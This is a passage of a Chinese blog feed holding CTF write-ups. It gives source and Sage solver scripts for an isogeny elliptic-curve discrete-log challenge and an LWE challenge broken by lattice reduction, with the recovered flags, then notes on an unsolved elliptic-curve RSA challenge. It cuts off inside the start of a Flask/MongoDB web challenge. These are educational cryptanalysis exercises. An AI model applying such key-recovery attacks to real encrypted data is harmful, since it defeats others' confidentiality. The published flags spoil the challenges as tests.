cnss&#123;y0u_4re_m4s7er_d1scr3te_l0g&#125;</span><br><span class="line">[*] time: <span class="number">180.23613619804382</span></span><br></pre></td></tr></table></figure><h2 id="椭…椭圆曲线？1-🦄-迷星叫"><a href="#椭…椭圆曲线？1-🦄-迷星叫" class="headerlink" title="椭…椭圆曲线？1(🦄 迷星叫)"></a>椭…椭圆曲线？1(🦄 迷星叫)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, key</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p=<span class="number">4</span> * prod(random.sample([*primes(<span class="number">3</span>, <span class="number">256</span>)], k = <span class="number">32</span>)) - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">F = GF(p)</span><br><span class="line">ells = <span class="built_in">list</span>(prime_divisors((p + <span class="number">1</span>) // <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">A, P, ekey</span>):</span><br><span class="line">    E = EllipticCurve(F, [<span class="number">0</span>, A, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> (e, ell) <span class="keyword">in</span> <span class="built_in">zip</span>(ekey, ells):</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> (Q := (p + <span class="number">1</span>) // ell * E.random_element()):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            phi = E.isogeny(Q)</span><br><span class="line">            P = phi(P)</span><br><span class="line">            E = phi.codomain()</span><br><span class="line">    phi = E.isomorphism_to(E.montgomery_model())</span><br><span class="line">    <span class="keyword">return</span> phi(P)</span><br><span class="line"></span><br><span class="line">m = <span class="number">4</span></span><br><span class="line">data = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ekey = [random.randrange(<span class="number">0</span>, m) <span class="keyword">for</span> _ <span class="keyword">in</span> ells]</span><br><span class="line">    E = EllipticCurve(F, [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    P = E.random_element()</span><br><span class="line">    Q = key * P</span><br><span class="line">    data.append((encrypt(<span class="number">0</span>, P, ekey).xy(), encrypt(<span class="number">0</span>, Q, ekey).xy()))</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key = long_to_bytes(key), mode = AES.MODE_ECB)</span><br><span class="line">enc = cipher.encrypt(pad(flag, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;data = <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 256164319887327000989059029935823287458865939529442604969219</span></span><br><span class="line"><span class="string">data = [((133322079708888134755019133444750161850879838598642433684887, 141662416810310244901219160105878753684218815280213343782668), (229143019021594526687304781835968753291812313242978239625102, 197368860501718054721602204458353352625750671877991598154057)), ((187134450081607478089479488801524874232630053794005900575216, 108690106297722459738228043998568418620629744138148194690181), (158737296444873957747216583327576148521622006828733278132244, 21759841797267370899319253789108512363816846645505810398443)), ((18592521600279966910815352919263447903089956838725738504356, 217007987923415358882996311453118946045551003198364830822737), (72802893837043345748680021219614457864560584498084819044335, 222972538476200390779435449736524404899986548610269476763396)), ((214951010493336432708756958146170664734100491612877932290657, 206792141318815098607404794799281385860758537898905322132398), (33011808565377048731911863657787101878775783475990031474694, 241862920640278847851897950044938935131848397480764375514952))]</span></span><br><span class="line"><span class="string">enc = b&#x27;|\xb3\x18/9YN\x11\xd4a\xc1\x11\x1648\xbaK\x8dt\xd5\x02\xa9\x94\xac\x95*[f\x07-+\xd1\xb2\x1a\\\xe8\x84\x8c\x85*N\x02f\x94\x1d\x91f%&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$曲线的阶N=P+1，光滑$<br>$此处的encrypt函数将曲线y^{2}=x^{3}+Ax^{2}+x\pmod P做同源映射，到蒙哥马利模型上，得到蒙哥马利曲线，并返回点在新模型下的坐标$</p><p>$data的生成：曲线y^{2}=x^{3}+x\pmod P$<br>$ECDLP: Q=key\cdot P，同时PQ每次都被同样的秘钥加密，然后做映射塞入到data中$</p><p>$通过点坐标可以恢复蒙哥马利曲线E’$<br>$因为是同源映射，Q’=key\cdot P’$<br>$但是用discrete_log求解方程的时候，求的其实是k$<br>$k\equiv key\pmod {order(P’)}$<br>$Q’=k\cdot P’$<br>$我们可以找到四个k，以及四次P’在E’上的阶，通过中国剩余定理恢复出key$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">256164319887327000989059029935823287458865939529442604969219</span></span><br><span class="line">data = [((<span class="number">133322079708888134755019133444750161850879838598642433684887</span>, <span class="number">141662416810310244901219160105878753684218815280213343782668</span>), (<span class="number">229143019021594526687304781835968753291812313242978239625102</span>, <span class="number">197368860501718054721602204458353352625750671877991598154057</span>)), ((<span class="number">187134450081607478089479488801524874232630053794005900575216</span>, <span class="number">108690106297722459738228043998568418620629744138148194690181</span>), (<span class="number">158737296444873957747216583327576148521622006828733278132244</span>, <span class="number">21759841797267370899319253789108512363816846645505810398443</span>)), ((<span class="number">18592521600279966910815352919263447903089956838725738504356</span>, <span class="number">217007987923415358882996311453118946045551003198364830822737</span>), (<span class="number">72802893837043345748680021219614457864560584498084819044335</span>, <span class="number">222972538476200390779435449736524404899986548610269476763396</span>)), ((<span class="number">214951010493336432708756958146170664734100491612877932290657</span>, <span class="number">206792141318815098607404794799281385860758537898905322132398</span>), (<span class="number">33011808565377048731911863657787101878775783475990031474694</span>, <span class="number">241862920640278847851897950044938935131848397480764375514952</span>))]</span><br><span class="line">enc = <span class="string">b&#x27;|\xb3\x18/9YN\x11\xd4a\xc1\x11\x1648\xbaK\x8dt\xd5\x02\xa9\x94\xac\x95*[f\x07-+\xd1\xb2\x1a\\\xe8\x84\x8c\x85*N\x02f\x94\x1d\x91f%&#x27;</span></span><br><span class="line"></span><br><span class="line">F = GF(p)</span><br><span class="line">remainders = []</span><br><span class="line">moduli = []</span><br><span class="line"><span class="keyword">for</span> i, ((xp, yp), (xq, yq)) <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">    xp, yp, xq, yq = F(xp), F(yp), F(xq), F(yq)</span><br><span class="line">    xp_sq_inv = (xp^<span class="number">2</span>)^-<span class="number">1</span></span><br><span class="line">    A_prime = (yp^<span class="number">2</span> - xp^<span class="number">3</span> - xp) * xp_sq_inv</span><br><span class="line">    E_prime = EllipticCurve(F, [<span class="number">0</span>, A_prime, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>])</span><br><span class="line">    P_prime = E_prime(xp, yp)</span><br><span class="line">    Q_prime = E_prime(xq, yq)</span><br><span class="line">    order = P_prime.order()</span><br><span class="line">    moduli.append(order)</span><br><span class="line">    k = P_prime.discrete_log(Q_prime)</span><br><span class="line">    remainders.append(k)</span><br><span class="line">key = crt(remainders, moduli)</span><br><span class="line">key = long_to_bytes(<span class="built_in">int</span>(key), <span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key=key, mode=AES.MODE_ECB)</span><br><span class="line">flag = cipher.decrypt(enc)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;\n[+] Flag: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="格…格基规约？-❄️-White-Album-2"><a href="#格…格基规约？-❄️-White-Album-2" class="headerlink" title="格…格基规约？(❄️ White Album 2)"></a>格…格基规约？(❄️ White Album 2)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">150</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(p, <span class="number">1</span> / <span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg</span>):</span><br><span class="line">    L = <span class="number">512</span></span><br><span class="line">    lenL = random.randrange(<span class="number">0</span>, L - <span class="built_in">len</span>(msg) + <span class="number">1</span>)</span><br><span class="line">    lenR = L - <span class="built_in">len</span>(msg) - lenL</span><br><span class="line">    <span class="keyword">return</span> os.urandom(lenL) + msg + os.urandom(lenR)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg</span>):</span><br><span class="line">    s = [bytes_to_long(msg[i : i + <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg), <span class="number">16</span>)]</span><br><span class="line">    ls = <span class="built_in">len</span>(s)</span><br><span class="line">    Fp = GF(p)</span><br><span class="line">    A = random_matrix(Fp, ls * ls, ls)</span><br><span class="line">    s = vector(Fp, s)</span><br><span class="line">    e = vector(Fp, [random.randrange(-m, m + <span class="number">1</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ls * ls)])</span><br><span class="line">    b = A * s + e</span><br><span class="line">    <span class="keyword">return</span> A, b</span><br><span class="line"></span><br><span class="line">A, b = encrypt(pad(flag))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;A = <span class="subst">&#123;<span class="built_in">list</span>(A)&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;b = <span class="subst">&#123;<span class="built_in">list</span>(b)&#125;</span>\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>$flag被前后pad为512字节，分成了32段的s，A是1024*32的随机矩阵，错误向量e_{i}\in [-2^{50},2^{50}]，还是很大的数$</p><p>$A的维度太大了，并且flag是被前后填充的，实际就可能中间的三四块，可以优化的地方是这两个$</p><p>但是不管了，先把糖醋小鸡块师傅的<a href="https://tangcuxiaojikuai.xyz/post/758dd33a.html">LWE-primal attack(优化版本)</a>拿过来跑了</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">m,n,esz = <span class="number">512</span>, <span class="number">32</span>, <span class="number">2</span>**<span class="number">50</span></span><br><span class="line">start = time()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    p_str = f.readline().strip()</span><br><span class="line">    A_str = f.readline().strip()</span><br><span class="line">    b_str = f.readline().strip()</span><br><span class="line">    p = ast.literal_eval(p_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    A_list = ast.literal_eval(A_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line">    b_list = ast.literal_eval(b_str.split(<span class="string">&#x27;=&#x27;</span>)[<span class="number">1</span>].strip())</span><br><span class="line"></span><br><span class="line">A = Matrix(ZZ, A_list[:m])</span><br><span class="line">b = vector(ZZ, b_list[:m])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">primal_attack2</span>(<span class="params">A,b,m,n,p,esz</span>):</span><br><span class="line">    L = block_matrix(</span><br><span class="line">        [</span><br><span class="line">            [matrix(Zmod(p), A).T.echelon_form().change_ring(ZZ), <span class="number">0</span>],</span><br><span class="line">            [matrix.zero(m - n, n).augment(matrix.identity(m - n) * p), <span class="number">0</span>],</span><br><span class="line">            [matrix(ZZ, b), <span class="number">1</span>],</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    <span class="comment">#print(L.dimensions())</span></span><br><span class="line">    Q = diagonal_matrix([<span class="number">1</span>]*m + [esz])</span><br><span class="line">    L *= Q</span><br><span class="line">    L = L.LLL()</span><br><span class="line">    L /= Q</span><br><span class="line">    res = L[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span>(res[-<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">        e = vector(GF(p), res[:m])</span><br><span class="line">    <span class="keyword">elif</span>(res[-<span class="number">1</span>] == -<span class="number">1</span>):</span><br><span class="line">        e = -vector(GF(p), res[:m])</span><br><span class="line">    s = matrix(Zmod(p), A).solve_right((vector(Zmod(p), b)-e))</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">s=primal_attack2(A,b,m,n,p,esz)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 攻击成功, 正在尝试恢复 Flag...&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        padded_flag_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> val <span class="keyword">in</span> s:</span><br><span class="line">            integer_val = <span class="built_in">int</span>(val.lift())</span><br><span class="line">            padded_flag_bytes += long_to_bytes(integer_val, <span class="number">16</span>)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 已恢复512字节的填充后消息。&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">b&#x27;cnss\&#123;[^\&#125;]+\&#125;&#x27;</span>, padded_flag_bytes)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            flag = <span class="keyword">match</span>.group(<span class="number">0</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;🎉🎉🎉 Flag 提取成功! 🎉🎉🎉&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n[-] 未能在恢复的数据中找到 &#x27;cnss&#123;...&#125;&#x27; 格式的 Flag。&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 恢复的原始数据（可能包含乱码）如下:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(padded_flag_bytes)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[!] 在 Flag 重建过程中发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[-] 攻击失败, 未能恢复向量 s。&quot;</span>)</span><br><span class="line"></span><br><span class="line">end = time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 总计用时 <span class="subst">&#123;end - start:<span class="number">.2</span>f&#125;</span>s&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[+] 攻击成功, 正在尝试恢复 Flag...</span><br><span class="line">[*] 已恢复<span class="number">512</span>字节的填充后消息。</span><br><span class="line"></span><br><span class="line">==================================================</span><br><span class="line">🎉🎉🎉 Flag 提取成功! 🎉🎉🎉</span><br><span class="line">[*] Flag: cnss&#123;9dbee80aaef3bfca2fb576a7e11d986f&#125;</span><br><span class="line">==================================================</span><br><span class="line">[*] 总计用时 <span class="number">9202.24</span>s</span><br></pre></td></tr></table></figure><p>$不负众望，我的电脑两个半小时拿下！$</p><h2 id="椭…椭圆曲线？2-🌂-壹雫空"><a href="#椭…椭圆曲线？2-🌂-壹雫空" class="headerlink" title="椭…椭圆曲线？2*(🌂 壹雫空)"></a>椭…椭圆曲线？2*(🌂 壹雫空)</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> namedtuple</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">inf = -<span class="number">1</span></span><br><span class="line">Point = namedtuple(<span class="string">&#x27;Point&#x27;</span>, [<span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>])</span><br><span class="line">Pubkey = namedtuple(<span class="string">&#x27;Pubkey&#x27;</span>, [<span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;r&#x27;</span>])</span><br><span class="line">Privkey = namedtuple(<span class="string">&#x27;Privkey&#x27;</span>, [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;d&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Curve</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params">self, nbits, dbits</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span>(p % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">if</span>(q % <span class="number">3</span> == <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        n = p * q</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = getRandomRange(<span class="number">1</span>,n)</span><br><span class="line">            <span class="keyword">if</span>((<span class="built_in">pow</span>(r, (p-<span class="number">1</span>)//<span class="number">3</span>, p) != <span class="number">1</span>) <span class="keyword">and</span> (<span class="built_in">pow</span>(r, (q-<span class="number">1</span>)//<span class="number">3</span>, q) != <span class="number">1</span>)):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        d = getPrime(dbits)</span><br><span class="line">        e = inverse(d, (p * p + p + <span class="number">1</span>) * (q * q + q + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> Pubkey(n, e, r), Privkey(p, q, d)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, nbits, dbits</span>):</span><br><span class="line">        self.Pubkey, self.Privkey = self.genkey(nbits, dbits)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">product</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        n, _, r = self.Pubkey</span><br><span class="line">        <span class="keyword">if</span>(a == Point(inf, inf)):</span><br><span class="line">            <span class="keyword">return</span> b</span><br><span class="line">        <span class="keyword">if</span>(b == Point(inf, inf)):</span><br><span class="line">            <span class="keyword">return</span> a</span><br><span class="line">        <span class="keyword">if</span>(a.y == inf):</span><br><span class="line">            a, b = b, a</span><br><span class="line">        u, v = a</span><br><span class="line">        p, q = b</span><br><span class="line">        <span class="keyword">if</span>(q == inf):</span><br><span class="line">            <span class="keyword">if</span>(v == inf):</span><br><span class="line">                <span class="keyword">return</span> Point((u * p) % n, (u + p) % n)</span><br><span class="line">            <span class="keyword">elif</span>((v + p) % n):</span><br><span class="line">                iv = inverse(v + p, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + r) * iv % n, (u + v * p) * iv % n)</span><br><span class="line">            <span class="keyword">elif</span>((u - v * v) % n):</span><br><span class="line">                iv = inverse(u - v * v, n) </span><br><span class="line">                <span class="keyword">return</span> Point((u * p + r) * iv % n, inf)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> Point(inf, inf)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span>((u + p + v * q) % n):</span><br><span class="line">                iv = inverse(u + p + v * q, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + (v + q) * r) * iv % n, (v * p + u * q + r) * iv % n)</span><br><span class="line">            <span class="keyword">elif</span>((v * p + u * q + r) % n):</span><br><span class="line">                iv = inverse(v * p + u * q + r, n)</span><br><span class="line">                <span class="keyword">return</span> Point((u * p + (v + q) * r) * iv % n, inf)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> Point(inf, inf)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, a</span>):</span><br><span class="line">        k = self.Pubkey.e</span><br><span class="line">        res = Point(inf, inf)</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                res = self.product(res, a)</span><br><span class="line">            a = self.product(a, a)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, a</span>):</span><br><span class="line">        k = self.Privkey.d</span><br><span class="line">        res = Point(inf, inf)</span><br><span class="line">        <span class="keyword">while</span> k:</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                res = self.product(res, a)</span><br><span class="line">            a = self.product(a, a)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">SYS = Curve(<span class="number">512</span>, <span class="number">256</span>)</span><br><span class="line">msg = Point(bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>]),bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:]))</span><br><span class="line">enc = SYS.encrypt(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;pubkey = <span class="subst">&#123;SYS.Pubkey&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;enc = <span class="subst">&#123;enc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">pubkey = Pubkey(n=4873189510606632670051462507037860421077551672164701436608907002436560192840356016750494285565924106988544952397402675547921930867836902302893011890256779, e=13378485234962864327763969254924381829836619219064695812825856516258702951436596931331119028308233868359134774242758549790397497067433124687542530097719178781601238604579006713726763589993220493028013459103929256891706082648574000763659034977028816094438365563682368664776491208827662655323646975736791610283, r=12276290027089634179666721556762461660058574159904682072699747683370547320796053531346228587347389593630764829928291692127976550810879034430985232250912)</span></span><br><span class="line"><span class="string">enc = Point(x=2091733356436558288163136748650604712672684547651742349852169921359344595959145998331036292720052611932763413100160720842985758067666744134352011068441384, y=3606887286200111465466487525784448417643735862168228528263397534620187006806130329379762200338558634931139253300267143260393005244954232632353514520202318)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>自定义公钥系统，不一样的<code>KMOV</code>？<br><code>p % 3 == 1</code>，见过<code>余2</code>的，还没见过<code>余1</code>的<br><strong>椭圆曲线上的RSA</strong></p><p>这题的方向应该是基于<strong>大整数很难被分解</strong>，关键是要找到<code>r</code>怎么去利用？<br>暂时就这么些思考了……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Crypto&quot;&gt;&lt;a href=&quot;#Crypto&quot; class=&quot;headerlink&quot; title=&quot;Crypto&quot;&gt;&lt;/a&gt;Crypto&lt;/h1&gt;&lt;p&gt;原来是这样，去年招新赛的题放到了&lt;code&gt;summer&lt;/code&gt;，那新生就惨喽&lt;br&gt;&lt;img src</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NSSCTF 4th-WriteUp</title>
    <link href="https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/"/>
    <id>https://hvang10.github.io/2025/08/24/NSSCTF-4th-WriteUp/</id>
    <published>2025-08-24T10:25:48.000Z</published>
    <updated>2025-09-15T18:58:22.981Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png" alt=""><br>哦豁，这场化身<strong>AI大师</strong>，周末上大分</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify</span><br><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">client = MongoClient(<span class="string">&quot;mongodb://localhost:27017/&quot;</span>)</span><br><span class="line">db = client[<span class="string">&#x27;aggie_bookstore&#x27;</span>]</span><br><span class="line">books_collection = db[<span class="string">&#x27;books&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize</span>(<span class="params">input_str: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[^a-zA-Z0-9\s]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, input_str)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, books=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/search&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    query = &#123;<span class="string">&quot;$and&quot;</span>: []&#125;</span><br><span class="line">    books = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        title = request.args.get(<span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line">        author = request.args.get(<span class="string">&#x27;author&#x27;</span>, <span class="string">&#x27;&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line">        title_clean = sanitize(title)</span><br><span class="line">        author_clean = sanitize(author)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> title_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;title&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: title_clean&#125;&#125;)  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> author_clean:</span><br><span class="line">            query[<span class="string">&quot;$and&quot;</span>].append(&#123;<span class="string">&quot;author&quot;</span>: &#123;<span class="string">&quot;$eq&quot;</span>: author_clean&#125;&#125;) </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> query[<span class="string">&quot;$and&quot;</span>]:</span><br><span class="line">            books = <span class="built_in">list</span>(books_collection.find(query))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, 